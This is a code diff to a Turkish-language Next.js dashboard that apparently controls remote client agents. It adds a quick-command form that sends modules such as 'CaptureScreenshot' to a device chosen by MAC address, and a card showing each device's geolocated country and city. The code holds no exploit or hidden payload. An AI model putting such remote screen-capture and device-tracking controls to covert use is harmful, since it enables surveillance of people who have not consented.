@@ -1,6 +1,7 @@
 "use client";
 
 import Link from "next/link";
+import { useState } from "react";
 import { Radio, Terminal, KeyRound, Package } from "lucide-react";
 import type { ClientCommand, HeartbeatRow } from "@/lib/db";
 import type { LicenseRecord, ModuleRecord } from "@/lib/types";
@@ -24,6 +25,8 @@ type LogRow = {
 
 type TopModule = Pick<ModuleRecord, "methodName" | "runCount">;
 
+type GeoRow = { mac: string; hostname?: string | null; ip: string; country: string; city?: string };
+
 export default function DashboardClient({
   apiEndpointCount,
   moduleCount,
@@ -46,6 +49,9 @@ export default function DashboardClient({
   firmAutoModuleCount,
   globalChain,
   cmdErrorRecent,
+  allMacs,
+  allModuleNames,
+  geoLocations = [],
 }: {
   apiEndpointCount: number;
   moduleCount: number;
@@ -68,7 +74,30 @@ export default function DashboardClient({
   firmAutoModuleCount: number;
   globalChain: string;
   cmdErrorRecent: ClientCommand[];
+  allMacs: string[];
+  allModuleNames: string[];
+  geoLocations?: GeoRow[];
 }) {
+  const [qcMac, setQcMac] = useState(allMacs[0] ?? "");
+  const [qcModule, setQcModule] = useState("CaptureScreenshot");
+  const [qcSending, setQcSending] = useState(false);
+
+  async function sendQuickCommand() {
+    if (!qcMac || !qcModule) return;
+    setQcSending(true);
+    try {
+      const r = await fetch("/api/commands/", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mac: qcMac, moduleName: qcModule, createdBy: "dashboard-quick" }),
+      });
+      const j = await r.json();
+      if (!j.success) alert(j.error ?? "Komut gönderilemedi.");
+    } finally {
+      setQcSending(false);
+    }
+  }
+
   return (
     <div className="page-wrap page-wrap--wide">
       <PageHeader
@@ -109,6 +138,46 @@ export default function DashboardClient({
           href="/moduller"
         />
       </div>
+
+      <div className="card" style={{ marginBottom: 16 }}>
+        <div className="card-header">
+          <span className="card-title">⚡ Hızlı Komut</span>
+          <Link href="/komutlar" className="card-link">Komutlar</Link>
+        </div>
+        <div style={{ padding: "12px 18px", display: "flex", gap: 10, flexWrap: "wrap", alignItems: "flex-end" }}>
+          <label style={{ fontSize: 12, display: "flex", flexDirection: "column", gap: 4 }}>
+            MAC
+            <select className="form-input" value={qcMac} onChange={(e) => setQcMac(e.target.value)} style={{ minWidth: 160 }}>
+              {allMacs.map((m) => <option key={m} value={m}>{m}</option>)}
+            </select>
+          </label>
+          <label style={{ fontSize: 12, display: "flex", flexDirection: "column", gap: 4, flex: 1, minWidth: 180 }}>
+            Modül
+            <select className="form-input" value={qcModule} onChange={(e) => setQcModule(e.target.value)}>
+              {allModuleNames.map((m) => <option key={m} value={m}>{m}</option>)}
+            </select>
+          </label>
+          <button type="button" className="btn btn-primary" onClick={sendQuickCommand} disabled={qcSending || !qcMac}>
+            {qcSending ? "…" : "Gönder"}
+          </button>
+        </div>
+      </div>
+
+      {geoLocations.length > 0 && (
+        <div className="card" style={{ marginBottom: 16 }}>
+          <div className="card-header">
+            <span className="card-title">🌍 Coğrafi IP Özeti</span>
+            <Link href="/cihazlar" className="card-link">Cihazlar</Link>
+          </div>
+          <div style={{ padding: "8px 18px 14px", display: "flex", flexWrap: "wrap", gap: 8 }}>
+            {geoLocations.map((g) => (
+              <span key={g.mac} className="badge" style={{ fontSize: 11 }}>
+                {g.hostname ?? g.mac} · {g.country}{g.city ? `, ${g.city}` : ""}
+              </span>
+            ))}
+          </div>
+        </div>
+      )}
 
       <div className="quick-links">
         {[
